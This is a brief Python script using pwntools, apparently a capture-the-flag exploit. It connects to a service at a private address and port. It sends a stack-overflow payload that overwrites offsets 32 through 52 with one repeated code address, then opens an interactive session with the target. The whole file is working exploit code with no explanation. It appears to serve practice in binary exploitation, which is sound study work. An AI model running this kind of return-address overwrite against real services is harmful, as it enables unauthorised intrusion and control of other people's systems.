from pwn import *
io = remote("192.168.23.61", 20058)
#nc 192.168.23.61 20058

payload=fit({
    32: 0x080491f6,
    36: 0x080491f6,
    40: 0x080491f6,
    44: 0x080491f6,
    48: 0x080491f6,
    52: 0x080491f6,

})


io.sendline(payload)
io.interactive()
